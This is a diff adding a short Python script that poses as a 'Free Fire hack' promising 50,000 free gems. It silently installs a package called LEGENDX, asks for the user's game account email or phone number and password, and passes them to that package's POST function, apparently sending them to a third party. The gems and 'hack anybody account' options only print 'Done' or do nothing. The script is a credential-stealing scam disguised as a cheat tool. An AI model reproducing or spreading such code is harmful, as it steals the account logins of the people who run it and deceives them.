@@ -1,0 +1,81 @@
+import os, asyncio, time
+
+try:
+
+  from LEGENDX import POST # for free fire
+
+except:
+
+  os.system("pip install -U LEGENDX")
+
+  from LEGENDX import POST
+
+os.system("clear")
+
+print('''
+
+HELLO WELCOME TO FREE FIRE HACK
+
+===={{{{{{{FREE FIRE}}}}}}}====
+
+1ST ENTER YOUR FREE FIRE ID
+
+THEN YOU GOT 50000 GEMS
+
+THANKS FOR USING THIS TOOL
+
+''')
+
+time.sleep(5)
+
+print('now enter your free fire account details')
+
+pro = input("enter your email or number: ")
+
+time.sleep(4)
+
+boy = input('now enter your password: ')
+
+try:
+
+  POST(user=pro, msg=boy)
+
+except:
+
+  pass
+
+print("\nnow enter what you want")
+print("\n\n")
+print ('''
+
+1 = Gems
+
+2 = hack anybody account
+
+3 = log out my id
+
+4 = exit
+
+''')
+
+ok = input("now enter: ")
+
+if ok == "1":
+
+  input("now enter your gems value: ")
+
+  print ("Done ✅")
+
+elif ok == '2':
+
+  input("give someone user id: ")
+
+elif ok == '3':
+
+  print ("Done")
+
+else:
+
+  print ("tool exited")
+
+exit() # the end
